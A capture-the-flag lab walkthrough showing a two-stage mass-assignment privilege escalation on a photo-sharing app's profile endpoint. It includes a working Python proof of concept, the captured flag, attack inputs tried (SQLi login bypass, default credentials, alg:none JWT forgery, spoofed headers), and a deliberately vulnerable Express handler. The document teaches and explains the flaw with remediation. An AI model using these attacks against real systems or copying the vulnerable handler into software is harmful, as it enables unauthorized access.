# ottergram-010 - BugForge Lab Walkthrough

**URL:** https://lab-1785315603380-9nrfgq.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Mass Assignment - Privilege Escalation (two-stage)
**Flag:** `bug{NTSwimXzdIJgiPcVWBWyPCOKtnx99v94}`

---

## Summary

Ottergram is a photo-sharing SPA (posts, comments, likes, profiles, admin panel). The self-service
profile-edit endpoint accepts an unvalidated `role` field and writes it straight to the database.
Any authenticated user can promote themselves to `admin` and unlock most of the admin panel, but
one admin route enforces a separate, stricter check that specifically excludes the `admin` role.
Because the `role` column has no server-side allowlist, a second round of mass assignment with a
non-standard role value bypasses that check too.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT (Bearer token from registration/login)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT; `role` field in the body is ignored here |
| `/api/login` | POST | No | Takes `username` + `password` (not `email`) |
| `/api/profile` | PUT | JWT | **Vulnerable** - accepts and persists an arbitrary `role` string |
| `/api/admin` | GET | JWT + admin role | Correctly enforced |
| `/api/admin/users` | GET/PUT/DELETE | JWT + admin role | Correctly enforced (accepts `role: "admin"`) |
| `/api/admin/posts` | GET/DELETE | JWT + admin role | Correctly enforced (accepts `role: "admin"`) |
| `/api/admin/comments` | GET/DELETE | JWT + admin role | Correctly enforced (accepts `role: "admin"`) |
| `/api/admin/analytics` | GET | JWT + a *different* role check | **Also vulnerable** - excludes `role: "admin"`, flag returned here |

---

## Discovery

### Step 1 - Register and map the route surface

Registration returns a usable JWT directly. The JS bundle at `/static/js/main.09a13325.js`
exposes the full route surface: `/api/admin`, `/api/admin/analytics`, `/api/admin/comments`,
`/api/admin/posts`, `/api/admin/users`, `/api/login`, `/api/posts`, `/api/profile`,
`/api/register`, `/api/verify-token`.

### Step 2 - Rule out the classic Ottergram bug classes

This app family reuses the same theme across many distinct backend bugs across its instances, so
each classic pattern was checked directly against this instance:

- Default creds `admin/admin123`, `admin/admin`, `admin/password` - no token.
- SQLi login bypass (`' OR 1=1--` etc.) on `/api/login` - clean 400s.
- `alg:none` JWT forgery - rejected with 403.
- Mass assignment at `/api/register` (`role: "admin"` in the registration body) - accepted but
  silently ignored; `GET /api/verify-token` confirmed the account stayed `role: "user"`.
- `GET/DELETE /api/admin/*` without a token, or with a plain `user` role token - correctly 403
  with `{"error":"Admin access required"}`.

All of the above are known bugs from other Ottergram instances; each one is individually patched
here.

### Step 3 - Check the remaining write endpoints for missing validation

With registration-time mass assignment ruled out, the next candidate was the *separate*
profile-edit endpoint, `PUT /api/profile`, which is a different code path in Express apps and is
easy to forget to re-validate:

```
PUT /api/profile {"role":"admin"}
-> 200 {"message":"Profile updated successfully"}

GET /api/verify-token
-> {"user":{...,"role":"admin"}}
```

It worked. The role stuck, and a fresh `POST /api/login` afterwards confirmed the account is
genuinely `admin` in the database (not just a client-side artifact). `GET /api/admin`,
`/api/admin/users`, `/api/admin/posts`, `/api/admin/comments` were now all fully accessible -
full user/content moderation CRUD as a self-promoted admin.

### Step 4 - One admin route behaves differently

`GET /api/admin/analytics` kept returning `403 {"error":"Access denied"}` - a distinctly
different error string from every other admin route's `{"error":"Admin access required"}`, even
with a confirmed DB-level `role: "admin"` and a freshly issued JWT. Different error text is a
strong signal of a genuinely different authorization check in the code, not caching or a stale
token. The most likely explanation: this specific route's check does not accept the `admin` role
at all, and instead expects some other role value.

### Step 5 - The role column has no allowlist either

The admin panel's frontend UI only offers three options in its role-edit `<select>`: `user`,
`admin`, `subscriber`. That's a client-side-only constraint - `PUT /api/profile` never validates
`role` against an enum server-side. Brute-forcing a short list of plausible "internal" role
strings against `PUT /api/profile` followed by `GET /api/admin/analytics`:

```
superadmin, owner, root, moderator, superuser, developer, dev, analyst, analytics, staff,
manager, sysadmin
```

`role: "dev"` was accepted and unlocked analytics immediately:

```
GET /api/admin/analytics
-> {"totalUsers":8,...,"flag":"bug{NTSwimXzdIJgiPcVWBWyPCOKtnx99v94}"}
```

---

## Proof of Concept

```python
import json, urllib.request

BASE = "https://lab-1785315603380-9nrfgq.labs-app.bugforge.io"

def req(method, path, body=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    with urllib.request.urlopen(r) as resp:
        return json.loads(resp.read())

# Register a throwaway account
reg = req("POST", "/api/register", {
    "username": "pocuser1", "email": "pocuser1@bugforge.io", "password": "Password123!"
})
token = reg["token"]

# Stage 1: mass-assign role -> admin (unlocks /api/admin/* but NOT analytics)
req("PUT", "/api/profile", {"role": "admin"}, token=token)

# Stage 2: mass-assign role -> a non-enumerated value analytics actually trusts
req("PUT", "/api/profile", {"role": "dev"}, token=token)

# Flag is returned directly in the analytics dashboard JSON
print(req("GET", "/api/admin/analytics", token=token)["flag"])
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Default creds `admin/admin123`, `admin/admin`, `admin/password` | No token | No pre-seeded admin account |
| SQLi login bypass (`' OR 1=1--`) | Clean 400 | Parameterized query |
| `alg:none` JWT forgery | 403 | Signature enforced |
| `role:"admin"` in `/api/register` body | Ignored, stays `user` | Registration-time mass assignment patched here |
| `GET /api/admin/users/:id`, `/api/admin/posts/:id` (singular resource routes) | Not implemented, falls through to SPA HTML | Only list/PUT/DELETE routes exist for those resources |
| Headers (`X-Admin-Verified`, `X-Forwarded-For: 127.0.0.1`, `Referer`, `X-Requested-With`) on analytics | No effect | Confirms it's a DB-role check, not a header/IP check |
| `role:"admin"` on `/api/admin/analytics` | 403 `Access denied` | This route deliberately excludes the `admin` role |

---

## Root Cause

The profile-update handler writes the client-supplied `role` field with no server-side
validation against an allowed set of values:

```javascript
// Vulnerable pattern (approximate)
app.put("/api/profile", authenticate, async (req, res) => {
  const { full_name, bio, profile_picture, role } = req.body;
  await db.run(
    "UPDATE users SET full_name = ?, bio = ?, profile_picture = ?, role = ? WHERE id = ?",
    [full_name, bio, profile_picture, role, req.user.id]
  );
  res.json({ message: "Profile updated successfully" });
});
```

Compounding this, `/api/admin/analytics` uses a narrower authorization check than the rest of the
admin panel (e.g. `role === "dev"` instead of a general "is this user privileged" check), which
means even a properly-fixed `role: "admin"` mass-assignment guard elsewhere would not have closed
this specific route - the two bugs need to be fixed together: validate `role` against an enum on
write, and make every admin route check the same privilege predicate.

---

## CWE / OWASP

- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes
  (Mass Assignment)
- **CWE-863**: Incorrect Authorization
- **OWASP A01:2021** - Broken Access Control
- **OWASP A04:2021** - Insecure Design (client-side-only enum enforcement)
